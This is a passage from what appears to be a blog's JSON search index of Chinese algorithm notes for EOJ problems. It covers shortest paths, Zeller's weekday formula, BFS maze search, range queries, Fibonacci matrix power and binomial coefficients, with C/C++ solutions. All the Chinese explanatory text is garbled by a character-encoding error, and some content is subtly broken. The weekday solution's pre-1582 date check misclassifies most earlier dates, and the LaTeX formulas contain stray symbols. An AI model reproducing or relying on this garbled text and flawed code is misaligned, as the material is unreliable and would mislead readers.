\u003e\u003e m) { for (int i = 0; i \u003c n; ++i) g[i].clear(); for (int i = 0; i \u003c m; ++i) { cin \u003e\u003e u \u003e\u003e v \u003e\u003e w; g[u-1].push_back((edge){v-1, w}); g[v-1].push_back((edge){u-1, w}); } dijkstra(); cout \u003c\u003cdist2[n-1] \u003c\u003c endl; } return 0; } ","date":"2018-02-04","objectID":"/shortest-path/:2:0","tags":["å›¾è®º","æ¨¡ç‰ˆ"],"title":"æœ€çŸ­è·¯é—®é¢˜","uri":"/shortest-path/"},{"categories":["ç®—æ³•"],"content":"EOJ 3197 Invitation Cards æœ‰ç¼–å· 1ï½P çš„ç«™ç‚¹ï¼Œ æœ‰ Q æ¡å…¬äº¤è½¦è·¯çº¿ï¼Œå…¬äº¤è½¦è·¯çº¿åªä»ä¸€ä¸ªèµ·ç‚¹ç«™ç›´æ¥åˆ°è¾¾ç»ˆç‚¹ç«™ï¼Œæ˜¯å•å‘çš„ï¼Œæ¯æ¡è·¯çº¿æœ‰å®ƒè‡ªå·±çš„è½¦è´¹ã€‚ æœ‰ P ä¸ªäººæ—©ä¸Šä» 1 å‡ºå‘ï¼Œä»–ä»¬è¦åˆ°è¾¾æ¯ä¸€ä¸ªå…¬äº¤ç«™ç‚¹ï¼Œ ç„¶ååˆ°äº†æ™šä¸Šå†è¿”å›ç‚¹ 1ã€‚ æ±‚æ‰€æœ‰äººæ¥å›çš„æœ€å°è´¹ç”¨ä¹‹å’Œã€‚ å»çš„æ—¶å€™æ¯”è¾ƒå®¹æ˜“ï¼Œå°±æ˜¯æ±‚å•æºæœ€çŸ­è·¯ï¼›å›æ¥æ—¶æ˜¯æ±‚å¤šç‚¹åˆ°å•ç‚¹çš„æœ€çŸ­è·¯ï¼Œè€ƒè™‘åå‘å»ºå›¾ï¼Œé‚£ä¹ˆé—®é¢˜ä¹ŸåŒ–ä¸ºæ±‚å•æºæœ€çŸ­è·¯ã€‚ä¸¤æ¬¡ SPFA å³å¯ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int N = 1e6 + 10; const int INF = 0x3f3f3f3f; typedef long long ll; int n, m, head1[N], head2[N], dis[N], t1, t2; bool vis[N]; struct node {int u, v, w, next;} edge1[N\u003c\u003c1], edge2[N\u003c\u003c1]; ll spfa(node edge[], int head[]) { for (int i = 1; i \u003c= n; ++i) dis[i] = INF, vis[i] = 0; queue\u003cint\u003e q; q.push(1); dis[1] = 0, vis[1] = 1; while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for (int i = head[u]; ~i; i = edge[i].next) { int v = edge[i].v; if (dis[v] \u003e edge[i].w + dis[u]) { dis[v] = edge[i].w + dis[u]; if (!vis[v]) vis[v] = 1, q.push(v); } } } ll ans = 0; for (int i = 1; i \u003c= n; ++i) ans += dis[i]; return ans; } void add_edge(int u, int v, int w) { edge1[t1].v = v; edge1[t1].w = w; edge1[t1].next = head1[u]; head1[u] = t1++; edge2[t2].v = u; edge2[t2].w = w; edge2[t2].next = head2[v]; head2[v] = t2++; } int main() { int t, u, v, w; cin \u003e\u003e t; while (t--) { cin \u003e\u003e n \u003e\u003e m; t1 = t2 = 0; memset(head1, -1, sizeof(head1)); memset(head2, -1, sizeof(head2)); for (int i = 0; i \u003c m; ++i) { cin \u003e\u003e u \u003e\u003e v \u003e\u003e w; add_edge(u, v, w); } cout \u003c\u003cspfa(edge1, head1) + spfa(edge2, head2) \u003c\u003c endl; } return 0; } ","date":"2018-02-04","objectID":"/shortest-path/:3:0","tags":["å›¾è®º","æ¨¡ç‰ˆ"],"title":"æœ€çŸ­è·¯é—®é¢˜","uri":"/shortest-path/"},{"categories":["ç®—æ³•"],"content":"è®¡ç®—æœ€çŸ­è·¯å¾„æ¡æ•° æ±‚å‡ºæœ‰ n (1 \u003c n â‰¤ 100) ä¸ªç»“ç‚¹æœ‰å‘å›¾ä¸­ï¼Œç»“ç‚¹ 1 åˆ°ç»“ç‚¹ n çš„æœ€çŸ­è·¯å¾„ï¼Œä»¥åŠæœ€çŸ­è·¯å¾„çš„æ¡æ•°ã€‚ ç¬¬ä¸€è¡Œæœ‰ 2 ä¸ªæ•´æ•° n, m (0 \u003c m \u003c 3000)ï¼Œæ¥ä¸‹æ¥ m è¡Œæ¯è¡Œæœ‰ä¸‰ä¸ªæ•´æ•° u, v, w ç»“ç‚¹ u åˆ° v æœ‰ä¸€æ¡æƒä¸º w çš„è¾¹ (w \u003c 1e5)ã€‚ Dijkstra æ¨¡æ¿é¢˜ + é‡è¾¹åˆ¤å®šã€‚cnt æ•°ç»„è®°å½•æœ€çŸ­è·¯æ¡æ•°ï¼Œsame æ•°ç»„è®°å½•åŸæ¥è¾¹çš„æ¡æ•°ï¼ˆä¹Ÿå°±è®°å½•äº†é‡è¾¹æ¡æ•°ï¼‰ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int N = 105; const int INF = 0x3f3f3f3f; int v[N], d[N], mp[N][N], cnt[N], same[N][N]; int n, m; void init() { memset(same, 0, sizeof(same)); for (int i = 0; i \u003c N; ++i) for (int j = 0; j \u003c N; ++j) mp[i][j] = INF; int u, v, w; while (m--) { scanf(\"%d%d%d\", \u0026u, \u0026v, \u0026w); mp[u-1][v-1] = w; ++same[u-1][v-1]; } for (int i = 0; i \u003c n; ++i) { d[i] = (i ? INF : 0); cnt[i] = (i ? 0 : 1); } } void dijkstra() { for (int i = 0; i \u003c n; ++i) { int x, now = INF; for (int y = 0; y \u003c n; ++y) if (!v[y] \u0026\u0026 d[y] \u003c= now) now = d[x=y]; v[x] = 1; for (int y = 0; y \u003c n; ++y) if (!v[y]) { if (d[x] + mp[x][y] == d[y]) cnt[y] += cnt[x] * same[x][y]; else if (d[x] + mp[x][y] \u003cd[y]) { cnt[y] = cnt[x] * same[x][y]; d[y] = d[x] + mp[x][y]; } } } } int main() { cin \u003e\u003e n \u003e\u003e m; init(); memset(v, 0, sizeof(v)); dijkstra(); if (d[n-1] == INF) d[n-1] = -1; cout \u003c\u003cd[n-1] \u003c\u003c\" \"\u003c\u003c cnt[n-1] \u003c\u003c endl; return 0; } ","date":"2018-02-04","objectID":"/shortest-path/:4:0","tags":["å›¾è®º","æ¨¡ç‰ˆ"],"title":"æœ€çŸ­è·¯é—®é¢˜","uri":"/shortest-path/"},{"categories":["ç®—æ³•"],"content":"æ•´ç†äº† EOJ ä¸­é‡åˆ°çš„ä¸€äº›å€¼å¾—ä¸€è®°çš„é¢˜ç›®ã€‚ ","date":"2018-02-02","objectID":"/eoj-misc/:0:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ1424 Hard to Believe, but True! ç»™å®šä¸€ä¸ªç­‰å¼ï¼Œé—®ç­‰å¼ä»å³å¾€å·¦è¯»æ˜¯å¦æ­£ç¡®ã€‚ é¢˜ç›®ä¸éš¾ï¼Œä¸è¿‡ç”¨åˆ°äº†ä¸€äº›æœ‰è¶£çš„å­—ç¬¦ä¸²å¤„ç†ï¼Œæ‰€ä»¥è®°å½•ä¸‹æ¥ã€‚ #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e void rev_str(char s[]){ int c,i,j, len = strlen(s); for (i = 0, j = len - 1; i \u003c j; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; } } int main() { char str1[8]={0},str2[8]={0},str3[8]={0}; while (~scanf(\"%[^+]+%[^=]=%s\", str1, str2, str3)){ rev_str(str1);rev_str(str2);rev_str(str3); if (atoi(str3) == atoi(str2) + atoi(str1)) printf(\"True\\n\"); else printf(\"False\\n\"); if (atoi(str3) == 0 \u0026\u0026 atoi(str2) == 0 \u0026\u0026 atoi(str1) == 0) break; } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:1:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3322 ä¸‡å¹´å† ç»™å®šä¸€ä¸ªæ—¥æœŸï¼Œè¾“å‡ºè¯¥æ—¥æœŸæ˜¯æ˜ŸæœŸå‡ ã€‚ è¿™æ˜¯ä¸ªå†å²é¢˜ï¼Œå°±æ˜¯æ‰€è°“ OEIS é¢˜çš„åŒç±»ã€‚ ","date":"2018-02-02","objectID":"/eoj-misc/:2:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"ä¸ºä»€ä¹ˆè¯´æ˜¯å†å²é¢˜ï¼Ÿ ç½—é©¬æ•™çš‡æ ¼é‡Œé«˜åˆ©åä¸‰ä¸–åœ¨ 1582 å¹´ç»„ç»‡äº†ä¸€æ‰¹å¤©æ–‡å­¦å®¶ï¼Œæ ¹æ®å“¥ç™½å°¼æ—¥å¿ƒè¯´è®¡ç®—å‡ºæ¥çš„æ•°æ®ï¼Œå¯¹å„’ç•¥å†ä½œäº†ä¿®æ”¹ã€‚å°† 1582 å¹´ 10 æœˆ 5 æ—¥åˆ° 14 æ—¥ä¹‹é—´çš„ 10 å¤©å®£å¸ƒæ’¤é”€ï¼Œç»§ 10 æœˆ 4 æ—¥ä¹‹åä¸º 10 æœˆ 15 æ—¥ã€‚åæ¥äººä»¬å°†è¿™ä¸€æ–°çš„å†æ³•ç§°ä¸º â€œæ ¼é‡Œé«˜åˆ©å†â€ï¼Œä¹Ÿå°±æ˜¯ä»Šå¤©ä¸–ç•Œä¸Šæ‰€é€šç”¨çš„å†æ³•ï¼Œç®€ç§°æ ¼é‡Œå†æˆ–å…¬å†ã€‚ ","date":"2018-02-02","objectID":"/eoj-misc/:2:1","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"æ‰€ä»¥æ€ä¹ˆç®—æ˜ŸæœŸå‡ ï¼Ÿ è”¡å‹’å…¬å¼ (Zeller formula)ï¼š 1582.10.4 åï¼š $$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d-1)%7 $$ 1582.10.4 åŠä¹‹å‰ï¼š $$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d+2)%7 $$ å…¶ä¸­ m, d å¯¹åº”æœˆæ—¥ï¼Œc ä¸ºå¹´ä»½å‰ä¸¤ä½ï¼ˆä¸–çºªæ•° ** å‡ 1**ï¼‰ï¼Œy ä¸ºå¹´ä»½åä¸¤ä½ã€‚ åŸºå§†æ‹‰å°”æ£®å…¬å¼ (Kim larsson calculation formula)ï¼š $$ w=(d+2m+[\\frac{3(m+1)}{5}]+y+[\\frac{y}{4}]-[\\frac{y}{100}]+[\\frac{y}{400}]+1)%7 $$ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŸºå§†æ‹‰å°”æ£®å…¬å¼çš„ç»“æœä¸º 0 æ—¶è¡¨ç¤ºå‘¨ä¸€ï¼Œ6 è¡¨ç¤ºå‘¨æ—¥ï¼Œä»¥æ­¤ç±»æ¨ã€‚ ","date":"2018-02-02","objectID":"/eoj-misc/:2:2","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"æ³¨æ„äº‹é¡¹ ä¸¤ä¸ªå…¬å¼éƒ½éœ€è¦æŠŠæ¯å¹´çš„ 1ï¼Œ2 ä¸¤æœˆçœ‹ä½œä¸Šä¸€å¹´çš„ 13ï¼Œ14 ä¸¤æœˆã€‚ å¦æœ‰ä¸€ç§éœ€è¦äº‹å…ˆè®¡ç®—å¹´æœˆåŸºæ•°è¡¨çš„è®¡ç®—æ–¹æ³•ï¼Œç”±äºè¾ƒç¹çè¿™é‡Œä¸å†èµ˜è¿°ã€‚ ","date":"2018-02-02","objectID":"/eoj-misc/:2:3","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"ä»£ç  ï¼ˆä»…ä»¥è”¡å‹’å…¬å¼ä¸ºä¾‹ï¼‰ #include \u003cstdio.h\u003e void calc_day(int y, int m, int d) { if (m == 1 || m == 2){ // 1 æœˆ 2 æœˆæƒ…å†µç‰¹åˆ¤ --y; m += 12; } int c = y / 100; // å–å¹´ä»½å‰ä¸¤ä½ int yy = y - c * 100; // å–å¹´ä»½åä¸¤ä½ int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; // è”¡å‹’å…¬å¼ if (y \u003c= 1582 \u0026\u0026 m \u003c= 10 \u0026\u0026 d \u003c= 4) day += 3; // åˆ¤æ–­æ˜¯å¦åœ¨ 1582 å¹´ 10 æœˆ 4 æ—¥å‰ while (day \u003c 0) day += 7; // ç»“æœå¯èƒ½ä¸ºè´Ÿï¼Œè¿™é‡Œé¿å…äº†å®¹æ˜“å‡ºé”™çš„è´Ÿæ•°å–æ¨¡è¿ç®— day %= 7; switch(day){ case 1: printf(\"Monday\\n\");break; case 2: printf(\"Tuesday\\n\");break; case 3: printf(\"Wednesday\\n\");break; case 4: printf(\"Thursday\\n\");break; case 5: printf(\"Friday\\n\");break; case 6: printf(\"Saturday\\n\");break; default: printf(\"Sunday\\n\"); } return; } int main(void) { int y, m, d; scanf(\"%d-%d-%d\", \u0026y, \u0026m, \u0026d); calc_day(y, m, d); return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:2:4","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ1224 ç®€å•è¿·å®«é—®é¢˜ ä¸€å¤©ï¼Œsunny ä¸å°å¿ƒè¿›å…¥äº†ä¸€ä¸ªè¿·å®«ï¼Œä¸ä»…å¾ˆéš¾å¯»æ‰¾å‡ºè·¯ï¼Œè€Œä¸”æœ‰çš„åœ°æ–¹è¿˜æœ‰æ€ªç‰©ï¼Œä½†æ˜¯ sunny æœ‰è¶³å¤Ÿçš„èƒ½åŠ›æ€æ­»æ€ªç‰©ï¼Œä½†æ˜¯éœ€è¦ä¸€å®šçš„æ—¶é—´ï¼Œä½†æ˜¯ sunny æƒ³æ—©ä¸€ç‚¹èµ°å‡ºè¿·å®«ï¼Œæ‰€ä»¥è¯·ä½ å¸®åŠ©ä»–è®¡ç®—å‡ºæœ€å°‘çš„æ—¶é—´èµ°å‡ºè¿·å®«ï¼Œè¾“å‡ºè¿™ä¸ªæœ€å°‘æ—¶é—´ã€‚ æˆ‘ä»¬è§„å®šæ¯èµ°ä¸€æ ¼éœ€è¦æ—¶é—´å•ä½ 1, æ€æ­»æ€ªç‰©ä¹Ÿéœ€è¦æ—¶é—´ 1, å¦‚æœä¸èƒ½èµ°åˆ°å‡ºå£ï¼Œåˆ™è¾“å‡º impossible. æ¯æ¬¡èµ°åªèƒ½æ˜¯ä¸Šä¸‹å·¦å³ 4 ä¸ªæ–¹å‘ã€‚ å…ˆå››é¢é€ å¢™ï¼Œçœå»åˆ¤æ–­æ˜¯å¦å‡ºç•Œçš„å‡½æ•°ã€‚ä¹‹åå¯¹äºæœ‰æ€ªç‰©çš„æ ¼å­ï¼Œæ–°çŠ¶æ€å†æœç´¢æ ‘ä¸­æ˜¯å½“å‰çŠ¶æ€çš„ä¸‹ä¸¤å±‚çš„ï¼Œå› æ­¤ä¸èƒ½èµ°è¿‡ä¹‹åç›´æ¥ step+2 æ ‡è®°æ‰ï¼Œè€Œæ˜¯è¦è®°å½•ä¸‹è¿™ä¸ªçŠ¶æ€ (cnt=1)ã€‚å¾ˆå®¹æ˜“ WA çš„ç‚¹ã€‚ #include \u003ccstdio\u003e#include \u003cqueue\u003eusing namespace std; #define NEXT mp[p.x+dx[i]][p.y+dy[i]] struct node{int x, y, step, cnt;}; char mp[202][202]; int sx, sy, n, m, i; const int dx[4] = {-1, 0, 1, 0}; const int dy[4] = {0, 1, 0, -1}; void bfs() { queue\u003cnode\u003e q; q.push({sx, sy, 0, 0}); mp[sx][sy] = '#'; while (!q.empty()){ node p = q.front(); q.pop(); if (p.cnt == 1){ p.cnt = 0; q.push(p); continue; } for (i = 0; i \u003c 4; ++i) switch(NEXT){ case '.': NEXT = '#'; q.push({p.x+dx[i], p.y+dy[i], p.step+1, 0}); break; case 'X': NEXT = '#'; q.push({p.x+dx[i], p.y+dy[i], p.step+2, 1}); break; case 'T': printf(\"%d\\n\", p.step+1); return; } } printf(\"impossible\\n\"); } void init() { sx = sy = 0; for (i = 1; i \u003c= n; ++i){ for (int j = 1; j \u003c= m; ++j){ scanf(\"%c\", \u0026mp[i][j]); if (mp[i][j] == 'S') sx = i, sy = j; } getchar(); } for (i = 0; i \u003c= m+1; ++i) mp[0][i] = mp[n+1][i] = '#'; for (i = 0; i \u003c= n+1; ++i) mp[i][0] = mp[i][m+1] = '#'; } int main() { while (~scanf(\"%d%d\\n\", \u0026n, \u0026m)){ init(); bfs(); } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:3:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3367 å’¸é±¼ç¿»èº« ç»™å®š 01 åºåˆ—ï¼Œé€‰æ‹©ä¸€ä¸ªåŒºé—´ï¼Œå¯¹åŒºé—´ä¸­æ¯ä¸ªæ•°å–åï¼ˆ0 å˜ 1ï¼Œ1 å˜ 0ï¼‰ï¼Œæ±‚ 1 æœ€å¤šèƒ½æœ‰å¤šå°‘ä¸ªã€‚ æœ€å¤§åŒºé—´å’Œé—®é¢˜ã€‚å¯¹äº 1ï¼Œç¿»è½¬åæ”¶ç›Šï¼ˆ1 çš„ä¸ªæ•°ï¼‰ä¸º -1ï¼›å¯¹äº 0ï¼Œç¿»è½¬åæ”¶ç›Šä¸º +1ã€‚æ–¹ä¾¿èµ·è§ï¼Œè¯»å…¥æ—¶ç›´æ¥æŠŠæ•°å­—è½¬æ¢ä¸ºæ”¶ç›Šã€‚æœ€åæ±‚æœ€å¤§åŒºé—´å’Œï¼ŒåŠ ä¸ŠåŸæ¥ 1 çš„ä¸ªæ•°å°±æ˜¯ç­”æ¡ˆã€‚ç”±äºå’Œæœ€å¤§çš„åŒºé—´ä¸­ä¸ä¼šæœ‰ -1 å‡ºç°ï¼ŒåŒºé—´æ‰€è¦†ç›–çš„ä½ç½®ä¹Ÿä¸ä¼šåŒ…æ‹¬åŸæ¥ 1 æ‰€åœ¨çš„ä½ç½®ï¼Œå› æ­¤ä¸ä¼šé‡å¤ã€‚ #include \u003cstdio.h\u003e int a[100001]; int main() { int n,i,j,sum = 0,tot = 0,ans; scanf(\"%d\", \u0026n); for (i = 0; i \u003c n; ++i){ scanf(\"%d\", \u0026j); if (j){ a[i] = -1; sum++; } else a[i] = 1; } ans = a[0]; for (i = 0; i \u003c n; ++i){ if (tot\u003e 0) tot += a[i]; else tot = a[i]; ans = (tot\u003eans)?tot:ans; } printf(\"%d\\n\", ans + sum); return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:4:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3388 Balanced Lineup ç»™å®šä¸€ä¸ªæ•°åˆ—ï¼Œæ±‚è¯¢é—®åŒºé—´ä¸­çš„æœ€å¤§æœ€å°å€¼ä¹‹å·®ã€‚ æ™®é€šæ–¹æ³•ç”¨çº¿æ®µæ ‘æˆ– ST ç®—æ³•ï¼Œå¯¹è¿™é¢˜æ¥è¯´åŒºé—´ RMQ å°±å¯ä»¥äº†ã€‚æ—¶é—´å¤æ‚åº¦ O(nlogn)ã€‚ #include \u003ccstdio\u003e#include \u003calgorithm\u003e#include \u003ccmath\u003eusing namespace std; int linemax[50001][20], linemin[50001][20]; void rmq(int n) { for (int j = 1; j \u003c 20; ++j) for (int i = 1; i \u003c= n; ++i) if (i + (1 \u003c\u003c j) - 1 \u003c= n){ linemax[i][j] = max(linemax[i][j - 1], linemax[i + (1 \u003c\u003c (j - 1))][j - 1]); linemin[i][j] = min(linemin[i][j - 1], linemin[i + (1 \u003c\u003c (j - 1))][j - 1]); } } int main(void) { int n, len, a, b, x, maxc, minc; scanf(\"%d%d\", \u0026n, \u0026len); for (int i = 1; i \u003c= n; ++i){ scanf(\"%d\", \u0026linemax[i][0]); linemin[i][0] = linemax[i][0]; } rmq(n); while(len--){ scanf(\"%d%d\", \u0026a, \u0026b); x = (int)(log(b - a + 1) / log(2)); maxc = max(linemax[a][x], linemax[b - (1 \u003c\u003c x) + 1][x]); minc = min(linemin[a][x], linemin[b - (1 \u003c\u003c x) + 1][x]); printf(\"%d\\n\", maxc - minc); } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:5:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ1499 çŸ©é˜µå¿«é€Ÿå¹‚æ±‚æ–æ³¢é‚£å¥‘æ•°åˆ— ç»™å®š nï¼Œæ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—å‰ n é¡¹å’Œã€‚ 0 \u003c n \u003c 1e9 å¿«é€Ÿå¹‚å®ç°æ–¹å¼å’Œæ•´æ•°å·®ä¸å¤šï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚è€Œå¯¹äºæ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œä¸éš¾å‘ç°ï¼š $$ \\begin{pmatrix} F_{n+2} \u0026 a\\cr F_{n+1} \u0026 b \\end{pmatrix}{=} \\begin{pmatrix} 1 \u0026 1\\cr 1 \u0026 0 \\end{pmatrix} \\begin{pmatrix} F*{n+1}\\cr F_n \\end{pmatrix} $$ æˆ‘ä»¬è®° $$ \\begin{pmatrix} 1 \u0026 1\\cr 1 \u0026 0 \\end{pmatrix} $$ ä¸º $A$ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ¨å¾—ï¼š $$ \\begin{pmatrix} F*{n+1}\\cr F_n \\end{pmatrix}{=} A^n \\begin{pmatrix} 1\\cr 0 \\end{pmatrix} $$ äºæ˜¯å¯¹ $A^n$ æ±‚è§£å°±å¾ˆå®¹æ˜“å¾—åˆ°ç­”æ¡ˆäº†ã€‚ #include \u003ciostream\u003e #define MOD 100000000 using namespace std; typedef long long ll; struct Mat{ ll m[2][2]; }; Mat MatMul(Mat A, Mat B) { Mat ret; for (int i = 0; i \u003c 2; ++i) for (int j = 0 ; j \u003c 2; ++j){ ret.m[i][j] = 0; for (int k = 0; k \u003c 2; ++k) ret.m[i][j] += A.m[i][k] * B.m[k][j] % MOD; } return ret; } Mat MatPow(Mat A, ll n) { Mat ret; ret.m[0][0]=1; ret.m[0][1]=0; ret.m[1][0]=0; ret.m[1][1]=1; while (n){ if (n \u0026 1) ret = MatMul(ret, A); A = MatMul(A, A); n \u003e\u003e= 1; } return ret; } int main() { ll n; while(cin\u003e\u003e n){ Mat ans, A; ans.m[0][0]=1; ans.m[0][1]=0; A.m[0][0]=1; A.m[0][1]=1; A.m[1][0]=1; A.m[1][1]=0; ans = MatMul(ans, MatPow(A, n + 1)); cout \u003c\u003cans.m[0][0] - 1 \u003c\u003c endl; } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:6:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ ‘","çŸ©é˜µ","å¿«é€Ÿå¹‚","æ•°å­¦","å›¾è®º","æ¨¡ç‰ˆ"],"title":"EOJ æ‚é¢˜åˆé›†","uri":"/eoj-misc/"},{"categories":["ç®—æ³•"],"content":"EOJ3006 è®¡ç®—å¤šé¡¹å¼çš„ç³»æ•° ç»™å®šä¸€ä¸ªå¤šé¡¹å¼ $(ax+by)^k$ï¼Œè®¡ç®—å¤šé¡¹å¼å±•å¼€å $x^ny^m$ é¡¹çš„ç³»æ•°ï¼Œç»“æœå¯¹ 1000000007 å–æ¨¡ 0â‰¤kâ‰¤1,000,000ï¼Œ0â‰¤n,mâ‰¤kï¼Œä¸” n+m=kï¼Œ0â‰¤a,bâ‰¤10^9ã€‚ ç”±äº n, m è¿‡å¤§ä¸èƒ½ç›´æ¥é¢„å¤„ç†ç»„åˆæ•°ï¼›åˆå› ä¸º p è¿‡å¤§ Lucas å®šç†çš„é€’å½’å½¢å¼åœ¨è¿™é‡Œä¹Ÿä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚åæ¥æ‰å‘ç°åŸæ¥åªè¦é¢„å¤„ç†é˜¶ä¹˜ + å¿«é€Ÿå¹‚ + é€†å…ƒæ±‚ç»„åˆæ•°å°±å¯ä»¥äº†ã€‚ #include \u003cbits/stdc++.h\u003e#define p 1000000007 #define K 1000000 typedef long long ll; ll a, b, k, n, m, fac[K+1]; void init() { fac[0] = 1; for(int i = 1; i \u003c= K; ++i) fac[i] = fac[i-1]*i % p; } ll pow_mod(ll a, ll x) { ll ret = 1; while (x) { if (x \u0026 1) ret = (ret * a) % p; a = (a * a) % p; x \u003e\u003e= 1; } return ret; } ll C(ll n, ll m) { if(m\u003e n) return 0; return fac[n] * pow_mod((fac[m]*fac[n-m])%p, p-2) % p; } int main() { int cas; ll ans; scanf(\"%d\", \u0026cas); init(); for (int t = 0; t \u003c cas; ++t) { scanf(\"%lld%lld%lld%lld%lld\", \u0026a, \u0026b, \u0026k, \u0026n, \u0026m); ans = pow_mod(a, n); ans = (ans * pow_mod(b, m)) % p; ans = (ans * C(k, m)) % p; printf(\"case #%d:\\n%lld\\n\", t, ans); } return 0; } é¡ºä¾¿æ”¾ä¸ª Lucas æ¨¡æ¿å¤‡ç”¨ï¼Œn, m è¾ƒå¤§è€Œ p è¾ƒå°æ—¶å¯ç”¨ï¼š #include\u003cbits/stdc++.h\u003e#define P 10007 using namespace std; typedef long long ll; ll pow_mod(ll a, ll x, int p) { ll ret = 1; while(x) { if (x \u0026 1) ret = ret * a % p; a = a * a % p; x \u003e\u003e= 1; } return ret; } ll comb(ll a, ll b, int p) { if (a \u003c b) return 0; if (a == b) return 1; if (b\u003e a - b) b = a - b; ll ans = 1, ca = 1, cb = 1; for (ll i = 0; i \u003c b; ++i) { ca = (ca * (a - i)) % p; cb = (cb * (b - i)) % p; } ans = (ca * pow_mod(cb, p-2, p)) % p; return ans; } ll lucas(ll n, ll m, int p) { ll ans = 1; while(n \u0026\u0026 m \u0026\u0026 ans) { ans = (ans * comb(n%p, m%p, p)) % p; n /= p; m /= p; } return ans; } int main() { int cas, k; ll a, b, n, m; cin \u003e\u003e cas; for (int t = 0; t \u003c cas; ++t) { cin \u003e\u003e a \u003e\u003e b \u003e\u003e k \u003e\u003e n \u003e\u003e m; printf(\"case #%d:\\n\", t); if (n + m != k) cout \u003c\u003c\"0\" \u003c\u003c endl; else { ll ans = pow_mod(a, n, P); ans = (ans * pow_mod(b, m, P)) % P; ans = (ans * lucas(k, n, P)) % P; cout \u003c\u003c ans \u003c\u003c endl; } } return 0; } ","date":"2018-02-02","objectID":"/eoj-misc/:7:0","tags":["æ­£åˆ™è¡¨è¾¾å¼","æœç´¢","æœ€å¤§åŒºé—´å’Œ","çº¿æ®µæ 